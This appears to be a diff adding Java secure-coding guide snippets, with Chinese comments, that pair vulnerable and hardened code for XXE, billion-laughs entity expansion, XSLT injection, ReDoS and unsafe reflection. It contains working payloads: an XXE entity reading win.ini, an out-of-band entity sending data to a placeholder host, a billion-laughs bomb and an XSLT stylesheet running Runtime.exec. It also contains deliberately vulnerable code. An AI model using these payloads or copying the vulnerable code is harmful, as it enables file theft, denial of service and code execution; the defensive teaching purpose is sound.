@@ -1,0 +1,232 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
+<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
+<updateProfile>
+<firstname>Joe</firstname>
+<lastname>&file;</lastname>
+...
+</updateProfile>
+
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY all "%start;%goodies;%end;"> 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % send "<!ENTITY all SYSTEM 'http://mywebsite.com/?%gooddies;'>">
+%send; 
+
+private void parseXmlFile(String filePath) {
+try {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(new File(filePath));
+... // 解析xml文件中的内容
+} catch (ParserConfigurationException ex) {
+// 处理异常
+}
+...
+} 
+
+
+private void parserXmlFileDisableDtds(String filePath) {
+try {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(new File(filePath));
+... // 解析xml文件中的内容
+} catch (ParserConfigurationException ex) {
+// 处理异常
+}
+...
+} 
+
+
+private void parserXmlFileDisableExternalEntityes(String filePath) {
+try {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(new File(filePath));
+... // 解析xml文件中的内容
+} catch (ParserConfigurationException ex) {
+// 处理异常
+}
+...
+} 
+
+
+private static void parserXmlFileValidateEntities(String filePath) {
+try {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+db.setEntityResolver(new ValidateEntityResolver());
+Document doc = db.parse(new File(filePath));
+... // 解析xml文件中的内容
+} catch (ParserConfigurationException ex) {
+// 处理异常
+}
+...
+}
+class ValidateEntityResolver implements EntityResolver {
+private static final String GOOD_ENTITY = "file:/Users/onlinestore/good.xml";
+public InputSource resolveEntity(String publicId, String systemId)
+throws SAXException, IOException {
+if (publicId != null && publicId.equals(GOOD_ENTITY)) {
+return new InputSource(publicId);
+} else if (systemId != null && systemId.equals(GOOD_ENTITY)) {
+return new InputSource(systemId);
+} else {
+return new InputSource();
+}
+}
+} 
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz> 
+
+public void receiveXMLStream(InputStream inStream)
+throws ParserConfigurationException, SAXException, IOException {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+DocumentBuilder db = dbf.newDocumentBuilder();
+db.parse(inStream);
+} 
+
+
+public void receiveXMLStream(InputStream inStream)
+throws ParserConfigurationException, SAXException, IOException {
+// 使用系统属性限制
+System.setProperty("entityExpansionLimit", "200");
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+db.parse(inStream);
+} 
+public void receiveXMLStream(InputStream inStream)
+throws ParserConfigurationException, SAXException, IOException {
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setAttribute("http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit",
+"200");
+DocumentBuilder db = dbf.newDocumentBuilder();
+db.parse(inStream);
+} 
+
+public void XsltTrans(String src, String dst, String xslt) {
+// 获取转换器工厂
+TransformerFactory tf = TransformerFactory.newInstance();
+try {
+// 获取转换器对象实例
+Transformer transformer = tf.newTransformer(new StreamSource(xslt));
+// 进行转换
+transformer.transform(new StreamSource(src),
+new StreamResult(new FileOutputStream(dst)));
+...
+} catch (TransformerException ex) {
+// 处理异常
+}
+...
+} 
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:java="java">
+<xsl:template match="/" xmlns:os="java:lang.Runtime" >
+<xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
+<xsl:value-of select="os:exec($runtime, 'calc')" />
+</xsl:template>
+</xsl:stylesheet>
+
+
+
+public void xsltTrans(String src, String dst, String xslt) {
+// 获取转换器工厂
+TransformerFactory tf = TransformerFactory.newInstance();
+try {
+// 转换器工厂设置黑名单，禁用一些不安全的方法，类似XXE防护
+tf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
+// 获取转换器对象实例
+Transformer transformer = tf.newTransformer(new StreamSource(xslt));
+// 去掉<?xml version="1.0" encoding="UTF-8"?>
+transformer.setOutputProperty("omit-xml-declaration", "yes");
+// 进行转换
+transformer.transform(new StreamSource(src),
+new StreamResult(new FileOutputStream(dst)));
+...
+} catch (TransformerException ex) {
+// 处理异常
+}
+...
+} 
+
+
+
+private static final Pattern REGEX_PATTER = Pattern.compile("a(b|c+)+d");
+public static void main(String[] args) {
+...
+Matcher matcher = REGEX_PATTER.matcher(args[0]);
+if (matcher.matches()) {
+...
+} else {
+...
+}
+...
+} 
+
+
+private static final Pattern REGEX_PATTER = Pattern.compile("a[bc]+d");
+public static void main(String[] args) {
+...
+Matcher matcher = REGEX_PATTER.matcher(args[0]);
+if (matcher.matches()) {
+...
+} else {
+...
+}
+...
+}
+
+String key = request.getParameter("keyword");
+...
+String regex = "[a-zA-Z0-9_-]+@" + key + "\\.com";
+Pattern searchPattern = Pattern.compile(regex);
+...
+
+
+String className = request.getParameter("class");
+...
+Class objClass = Class.forName(className);
+BaseClass obj = (BaseClass) objClass.newInstance();
+obj.doSomething(); 
+
+String classIndex = request.getParameter("classIndex");
+String className = (String) reflectClassesMap.get(classIndex);
+if (className != null) {
+Class objClass = Class.forName(className);
+BaseClass obj = (BaseClass) objClass.newInstance();
+obj.doSomething();
+} else {
+throw new IllegalStateException("Invalid reflect class!");
+}
+... 
+
